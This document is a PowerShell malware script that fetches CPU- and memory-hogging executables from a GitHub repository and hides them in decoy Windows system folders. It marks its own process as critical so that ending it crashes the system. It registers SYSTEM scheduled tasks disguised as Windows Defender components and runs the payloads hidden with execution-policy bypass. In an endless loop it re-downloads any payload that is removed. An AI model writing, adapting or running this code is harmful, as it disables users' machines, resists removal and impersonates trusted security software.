param( [string]$basePath )

$cpuHogUri = "https://github.com/Soumyo001/progressive_overload/raw/refs/heads/main/payloads/cpu_hog.exe"
$memHogUri = "https://github.com/Soumyo001/progressive_overload/raw/refs/heads/main/payloads/mem_hog.exe"
$storageHogUri = "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/payloads/storage_hog.exe"
$memPropertyName = "mem"
$storagePropertyName = "store"
$cpuPropertyName = "cpu"
$user = ((Get-CimInstance -ClassName Win32_ComputerSystem).UserName -split '\\')[-1]

$paths =  @(
    "$env:windir\system32\config\systemprofile\AppData\Local","$env:windir\system32\LogFiles\WMI\RtBackup\AutoRecover\alpha\beta\gamma\unibeta\trioalpha\shadowdelta","$env:windir\Microsoft.NET\assembly\GAC_MSIL\PolicyCache\v4.0_Subscription\en-US\Resources\Temp","$env:windir\Microsoft.NET\assembly\GAC_64\PolicyCache\v4.0_Subscription\en\Temp\ShadowCopy","$env:windir\Logs\CBS\SddlCache\Backup\DiagTrack\Analytics\Upload", "$env:windir\Resources\Themes\Cursors\Backup\MicrosoftStore","$env:windir\System32\Tasks\Microsoft\Windows\PLA\System\Diagnostics\ETL\Traces\Archived","$env:windir\System32\DriverStore\FileRepository\netrndis-inf_amd64_abcd1234efgh5678\ConfigBackup",($env:systemdrive+"\Users\$user\AppData\Roaming\Adobe\Acrobat\DC\Security\OCSP\CertCache\Backup\Logs\dump"),($env:systemdrive + "\Recovery"),"$env:ProgramData\Microsoft\WindowsDefender\Platform\Config\MpEngine\Quarantine\Volatile","$env:ProgramData\Microsoft\EdgeCore\modules\stable_winupdate_aux\cache\media_metrics\prefetch","$env:ProgramData\Microsoft\Windows\AppRepository\StateCache\CacheIndex\Staging\DriverStore","$env:ProgramData\Microsoft\Edge\DevTools\HeapSnapshots\Cache\IndexedDB\dump","$env:ProgramData\Microsoft\Diagnosis\DownloadedSettings\Symbols\Public\CrashDump","$env:windir\system32\spool\drivers\x64\3\en-US","$env:windir\WinSxS\Temp\ManifestCache\PendingInstalls","$env:windir\WinSxS\Temp\ManifestCache\PendingInstalls\5645725642","$env:windir\WinSxS\FileMaps\programdata_microsoft_windows_wer_temp_783673b09e921b6b-cdf_ms\Windows\System32\Tasks\Microsoft\Windows\PLA\Diagnostics\Traces","$env:windir\WinSxS\amd64_netfx4-fusion-dll-b03f5f7f11d50a3a_4015840_none_19b5d9c7ab39bf74\microsoft\windows\servicingstack\Temp\Symbols\Debug","$env:windir\WinSxS\Manifests\x86_microsoft_windows_servicingstack_31bf3856ad364e35\Backup\Analytics\Cache","$env:windir\WinSxS\Catalogs\Index\Staging\DriverCache\ShadowCopy\Microsoft\Windows\Tasks\Services\Minidump","$env:windir\WinSxS\Manifests\amd64_abcdef0123456789_manifest\microsoft\windows\ProgramCache\ShadowCopy\Universal\Debug\Logs","$env:windir\WinSxS\Manifests\wow64_microsoft-windows-ability-assistant-db-31bf3856ad364e35_10_0_19041_4597_none_c873f8fba7f2e1a5\ProgramData\Ammnune\Acids\Backups\Logs\Recovery\SelectedFiles","$env:windir\WinSxS\Temp\Microsoft\Windows\Logs\Dump\CrashReports","$env:windir\WinSxS\ManifestCache\x86_netfx35linq_fusion_dll_b03f5f7f11d50a3a_4015840_cache","$env:windir\WinSxS\ManifestCache\x86_microsoft-windows_servicingstack_31bf3856ad364e35_100190413636_none_9ab8d1c1a1a8a1f0\ServiceStack\Programs\Updates","$env:windir\WinSxS\ManifestCache\amd64_microsoft-windows-aence-mitigations-c1_31bf3856ad364e35-100226212506_none_9a1f2d8e1d4c3f07","$env:windir\WinSxS\ManifestCache\x86_microsoft-windows-sgstack-servicingapi_31bf3856ad364e35_100190413636_none_0c8e1a1d3d0b0a1f","$env:windir\WinSxS\Backup\KB5034441_amd64_1234567890abcdef","$env:windir\WinSxS\Backup\wow64_microsoft-windows-ued-telemetry-client_31bf3856ad364e35_100226212506_none_1b3f8c7f1a9d0d42","$env:windir\WinSxS\Backup\amd64_netfx4-mscordacwks_b03f5f7f11d50a3a_4015744161_none_1a2b3c4d5e6f7d89","$env:windir\WinSxS\Backup\x86_presentationcore_31bf3856ad364e35_61760117514_none_49d7b7f5b8f0b0d5","$env:windir\ServiceProfiles\LocalService\AppData\Local\Microsoft\Windows\WinX","$env:windir\ServiceProfiles\LocalService\AppData\Local\Microsoft\Logs\Backup\Temp","$env:windir\ServiceProfiles\LocalService\AppData\Local\Microsoft\Windows\Caches\CRMDatabase\Index"
)


$mutexName = "Global\MyUniquePrion"
$mutex = New-Object System.Threading.Mutex($false, $mutexName)

$signature = @"
using System;
using System.Runtime.InteropServices;

public class CS {
    [DllImport("ntdll.dll")]
    public static extern int RtlSetProcessIsCritical(uint v1, uint v2, uint v3);
}
"@
Add-Type -TypeDefinition $signature
[CS]::RtlSetProcessIsCritical(1, 0, 0) | Out-Null

if($basePath -eq ""){
    $mutex.WaitOne()
    try {
        if(-not(Test-Path -Path "$env:temp\598600304.txt" -PathType Leaf)){
            $pa = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
            $pa = "$pa\async_fun.vbs"
            iwr -uri "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/payloads/fun/warning.vbs" -OutFile "$pa"
            wscript.exe $pa
            New-Item -Path "$env:temp\598600304.txt" -ItemType File -Force
        }
    }
    finally {
        $mutex.ReleaseMutex()
        exit
    }
}

$itemMem = Get-ItemProperty -Path "$basePath" -Name $memPropertyName -ErrorAction SilentlyContinue

if(-not($itemMem)){
    $idx = Get-Random -Minimum 0 -Maximum $paths.Length
    $memHogPath = $paths[$idx]
    $memHogPath = "$memHogPath\mem_hog.exe"
    New-ItemProperty -Path "$basePath" -Name $memPropertyName -Value $memHogPath -Force | Out-Null
    iwr -Uri $memHogUri -OutFile $memHogPath
}else { $memHogPath = $itemMem.$memPropertyName }

# $itemStore = Get-ItemProperty -Path "$basePath" -Name $storagePropertyName -ErrorAction SilentlyContinue

# if(-not($itemStore)){
#     $idx = Get-Random -Minimum 0 -Maximum $paths.Length
#     $storageHogPath = $paths[$idx]
#     $storageHogPath = "$storageHogPath\storage_hog.exe"
#     New-ItemProperty -Path "$basePath" -Name $storagePropertyName -Value $storageHogPath -Force | Out-Null
#     iwr -Uri $storageHogUri -OutFile $storageHogPath
# }else { $storageHogPath = $itemStore.$storagePropertyName }

$threshold = Get-Random -Minimum 80 -Maximum 86
$memHogTaskName = "windows defender profile"
$storageHogTaskName = "windows firewall profile"
$memTaskRunAction = "-ep bypass -noP -w hidden start-process powershell.exe -windowstyle hidden '$memHogPath'"
$storageTaskRunAction = "-ep bypass -noP -w hidden start-process powershell.exe -windowstyle hidden '$storageHogPath'"

function Get-RamPercentage{
    $mem = Get-WmiObject -Class Win32_OperatingSystem
    $totMem = $mem.TotalVirtualMemorySize
    $free = $mem.FreeVirtualMemory
    $used = $totMem - $free
    $percent = ($used / $totMem) * 100
    return [math]::Round($percent, 2)
}

function CheckTask-And-Recreate {
    [CmdletBinding()]
    param (
        [parameter(Mandatory=$true)]
        [string]$taskName,
        [Parameter(Mandatory=$true)]
        [string]$taskRunAction
    )
    
    begin {}
    
    process {
        $tsk = schtasks /query /tn $taskName /v /fo LIST
        if(-not $tsk){
        $xml = @"
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
    <RegistrationInfo>
        <Author>Microsoft Corporation</Author>
        <Description>Windows Defender Memory Optimization Utility</Description>
        <URI>\Microsoft\Windows\Defender\HealthMonitor</URI>
        <Date>2024-01-01T00:00:00</Date>
    </RegistrationInfo>
    <Principals>
        <Principal id="Author">
            <UserId>NT AUTHORITY\SYSTEM</UserId>
            <RunLevel>HighestAvailable</RunLevel>
        </Principal>
    </Principals>
    <Triggers>
        <BootTrigger>
            <Enabled>true</Enabled>
            <Delay>PT30S</Delay>
        </BootTrigger>
    </Triggers>
    <Settings>
        <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
        <ExecutionTimeLimit>PT0S</ExecutionTimeLimit> 
    </Settings>
    <Actions Context="Author">
        <Exec>
            <Command>powershell</Command>
            <Arguments>$taskRunAction</Arguments>
        </Exec>
    </Actions>
</Task>
"@
            $xml | Out-File -FilePath "$env:temp\gg.xml" -Force
            schtasks /create /tn $taskName /xml "$env:temp\gg.xml" /f
            schtasks /run /tn $taskName
            Remove-Item -Path "$env:temp\gg.xml" -Force
        }
        
        else{
            if($tsk -notcontains "Run As User:                          SYSTEM"){
                schtasks /end /tn $taskName
                schtasks /change /tn $taskName /ru SYSTEM /rl HIGHEST
                schtasks /run /tn $taskName
            }
        }
    }
    
    end {}
}

while ($true) {

    if(-not(Test-Path $memHogPath -PathType Leaf)){
        $memHogPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
        $memHogPath = "$memHogPath\mem_hog.exe"
        iwr -Uri $memHogUri -OutFile $memHogPath
        $memTaskRunAction = "-ep bypass -noP -w hidden start-process powershell.exe -windowstyle hidden '$memHogPath'"
        Set-ItemProperty -Path "$basePath" -Name $memPropertyName -Value $memHogPath -Force | Out-Null
        if(schtasks /query /tn $memHogTaskName){ schtasks /delete /tn $memHogTaskName /f 2>&1 | Out-Null }
    }
    # if(-not(Test-Path $storageHogPath -PathType Leaf)){
    #     schtasks /end /tn $storageHogTaskName
    #     $storageHogPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
    #     $storageHogPath = "$storageHogPath\storage_hog.exe"
    #     iwr -Uri $storageHogUri -OutFile $storageHogPath
    #     $storageTaskRunAction = "powershell -ep bypass -noP -w hidden start-process powershell.exe -windowstyle hidden '$storageHogPath'"
    #     Set-ItemProperty -Path "$basePath" -Name $storagePropertyName -Value $storageHogPath -Force | Out-Null
    #     schtasks /change /tn $storageHogTaskName /tr $storageTaskRunAction
    #     schtasks /run /tn $storageHogTaskName
    # }
    CheckTask-And-Recreate -taskName $memHogTaskName -taskRunAction $memTaskRunAction
    # CheckTask-And-Recreate -taskName $storageHogTaskName -taskRunAction $storageTaskRunAction

    $curr = Get-RamPercentage
    if($curr -ge $threshold){
        $item = Get-ItemProperty -Path "$basePath" -Name $cpuPropertyName -ErrorAction SilentlyContinue
        if($item){
            $cpuHogPath = $item.$cpuPropertyName
        }else{
            $cpuHogPath = "$($paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)])\cpu_hog.exe"
            New-ItemProperty -Path "$basePath" -Name $cpuPropertyName -Value $cpuHogPath -Force | Out-Null
        }
        iwr -Uri $cpuHogUri -OutFile $cpuHogPath
        powershell.exe -ep bypass -w hidden -noP $cpuHogPath
    }

}